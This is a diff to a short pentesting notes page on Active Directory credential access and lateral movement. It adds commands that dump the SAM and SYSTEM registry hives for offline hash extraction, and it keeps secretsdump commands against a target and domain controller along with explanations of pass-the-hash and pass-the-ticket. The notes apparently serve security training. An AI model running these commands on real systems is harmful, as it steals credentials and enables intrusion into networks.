@@ -1,6 +1,6 @@
 # Active Directory — Lateral Movement & Credential Access
 
-Once you have credentials or admin on one host, credential access harvests more secrets and lateral movement reuses them to reach new hosts. See [[AD Attacks Overview]].
+Once you have credentials or admin on one host, credential access harvests more secrets and lateral movement reuses them to reach new hosts. See [AD Attacks Overview](AD%20Attacks%20Overview.md).
 
 ## Credential access (where secrets live)
 
@@ -18,10 +18,16 @@ secretsdump.py <domain>/<user>:<pass>@<target>
 secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt
 ```
 
+```powershell
+# Windows-native local hive dump — parse offline with:  secretsdump.py -sam sam.save -system system.save LOCAL
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+```
+
 ## The two reuse primitives
 
 - **Pass-the-Hash (PtH):** NTLM auth only needs the hash, not the plaintext. Authenticate as the user with their NT hash.
-- **Pass-the-Ticket (PtT):** inject a stolen/forged Kerberos TGT or TGS into your session and use it. See [[Kerberos Attacks]].
+- **Pass-the-Ticket (PtT):** inject a stolen/forged Kerberos TGT or TGS into your session and use it. See [Kerberos Attacks](Kerberos%20Attacks.md).
 
 Both mean cracking is optional — a dumped hash or ticket is often enough to move.
 
